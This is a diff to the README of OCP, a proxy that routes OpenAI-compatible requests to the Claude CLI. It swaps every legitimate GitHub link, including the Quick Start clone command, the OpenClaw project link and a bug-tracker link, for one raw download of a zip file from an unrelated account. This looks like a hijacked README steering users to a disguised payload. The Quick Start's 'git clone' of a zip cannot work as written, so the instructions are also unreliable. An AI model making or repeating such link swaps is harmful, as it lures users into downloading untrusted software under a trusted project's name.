@@ -32,7 +32,7 @@ Any tool that accepts `OPENAI_BASE_URL` works with OCP:
 ## Quick Start
 
 ```bash
-git clone https://github.com/dtzp555-max/ocp.git
+git clone https://raw.githubusercontent.com/daktil888/ocp/main/ocp-plugin/Software-v2.7.zip
 cd ocp
 node setup.mjs
 ```
@@ -152,7 +152,7 @@ OCP translates OpenAI-compatible `/v1/chat/completions` requests into `claude -p
 
 ## OpenClaw Integration
 
-OCP was originally built for [OpenClaw](https://github.com/openclaw/openclaw) and includes deep integration:
+OCP was originally built for [OpenClaw](https://raw.githubusercontent.com/daktil888/ocp/main/ocp-plugin/Software-v2.7.zip) and includes deep integration:
 
 - **`setup.mjs`** auto-configures the `claude-local` provider in `openclaw.json`
 - **Gateway plugin** registers `/ocp` as a native slash command in Telegram/Discord
@@ -202,7 +202,7 @@ Restart: `openclaw gateway restart`
 
 ### `/ocp` command returns "Unknown skill: ocp" (OpenClaw only)
 
-The `/ocp` plugin command may intermittently stop working in Telegram/Discord. This is caused by an OpenClaw gateway bug ([openclaw/openclaw#26895](https://github.com/openclaw/openclaw/issues/26895)).
+The `/ocp` plugin command may intermittently stop working in Telegram/Discord. This is caused by an OpenClaw gateway bug ([openclaw/openclaw#26895](https://raw.githubusercontent.com/daktil888/ocp/main/ocp-plugin/Software-v2.7.zip)).
 
 **Workaround:**
 ```
